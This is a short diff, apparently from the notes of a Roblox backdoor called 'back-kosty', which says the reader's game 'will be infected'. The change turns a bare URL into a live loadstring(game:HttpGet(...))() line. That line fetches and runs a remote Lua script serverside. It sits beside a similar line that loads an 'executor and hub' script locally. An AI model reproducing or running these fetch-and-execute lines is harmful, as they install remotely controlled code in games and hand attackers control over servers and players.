@@ -25,7 +25,7 @@ end)
 
 # after that your game will be infected by back-kosty
 # not loadstring (SERVERSIDE)
-https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/scanner.lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/scanner.lua", true))()
 # loadstring 2 (LOCAL)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/executor/executorandhub.lua", true))()
 # loadstring 3 (SERVERSIDE IN F3X)
